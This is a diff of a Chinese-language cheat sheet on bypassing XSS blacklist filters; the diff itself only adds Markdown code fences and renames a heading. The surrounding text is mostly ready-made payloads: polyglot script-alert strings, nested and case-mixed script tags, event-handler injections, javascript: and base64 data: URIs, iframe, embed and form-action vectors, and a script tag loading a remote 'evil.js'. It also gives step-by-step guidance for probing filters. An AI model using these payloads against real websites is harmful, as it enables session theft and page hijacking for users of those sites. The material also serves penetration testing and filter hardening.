@@ -1,3 +1,4 @@
+```
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
 0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
@@ -107,9 +108,9 @@ alert;pg("XSS")
 <scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+```
 
-
-0x01 Bypassing黑名单
+### Bypassing黑名单
 大多数的场所是用的黑名单来做过滤器的，有三种方式绕过黑名单的测试：
 
 1、暴力测试（输入大量的payload，看返回结果）
@@ -121,61 +122,78 @@ alert;pg("XSS")
 2)尝试插入不闭合的标签，例如：<b，<i，<u，<marquee然后看一下返回响应，是否对开放的标签也有过滤。
 
 3)然后测试几个XSS的payload，基本所有的xss过滤器都会进行过滤的：
-
+```
 <script>alert(1);</script>
 <script>prompt(1);</script>
 <script>confirm(1);</script>
 <scriptsrc="http://rhainfosec.com/evil.js">
+```
 看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert,prompt,confirm字符，再尝试大小写的组合：
-
+```
 <scRiPt>alert(1);</scrIPt>
+```
 4)如果过滤器仅仅是把<script>和</script>标签过滤掉，那么可以用
-
+```
 <scr<script>ipt>alert(1)</scr<script>ipt>
+```
 的方式来绕过，这样当<script>标签被过滤掉，剩下的组合起来刚好形成一个完整的payload。
 
 5)用<a href标签来测试，看返回响应
-
+```
 <a href="http://www.google.com">Clickme</a>
+```
 <a标签是否被过滤 href是否被过滤 href里的数据是否被过滤
 
 如果没有数据被过滤，插入javascript协议看看：
-
+```
 <a href="javascript:alert(1)">Clickme</a>
+```
 是否返回错误 javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符 尝试下大小写转换
 
 继续测试事件触发执行javascript：
-
+```
 <a href="rhainfosec.com" onmouseover=alert(1)>ClickHere</a>
+```
 看onmouseover事件是否被过滤。测试一个无效的事件，看过滤规则：
-
+```
 <a href="rhainfosec.com" onclimbatree=alert(1)>ClickHere</a>
+```
 是完整的返回了呢，还是跟onmouseover一样被干掉了。
 
 如果是完整的返回的话呢，那么意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件测试一个很少见的事件：
-
+```
 <body/onhashchange=alert(1)><a href=#>clickit
+```
 测试其他标签
 接下来测试其他的标签跟属性
 
 Src属性
+```
 <img src=x onerror=prompt(1);>
 <img/src=aaa.jpg onerror=prompt(1);> 
 <video src=x onerror=prompt(1);>
 <audio src=x onerror=prompt(1);>
+```
 iframe标签
+```
 <iframe src="javascript:alert(2)">
 <iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+```
 embed标签
+```
 <embed/src=//goo.gl/nlX0P>
+```
 action属性
 利用<form，<isindex等标签中的action属性执行javascript
-
+```
 <form action="Javascript:alert(1)"><input type=submit>
 <isindex action="javascript:alert(1)" type=image>
 <isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>
 <isindex action=data:text/html, type=image>
 <formaction='data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt'><button>CLICK
+```
+
+```
 formaction属性
 <isindexformaction="javascript:alert(1)" type=image>
 <input type="image" formaction=JaVaScript:alert(0)>
@@ -388,7 +406,7 @@ http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&v=%E2%88%80%E3%B8%80%E3%B0%8
 其他等等一系列浏览器特性的XSS可以参考以下文章：
 
 http://drops.wooyun.org/tips/147
-
+```
 
 
 ### Ref
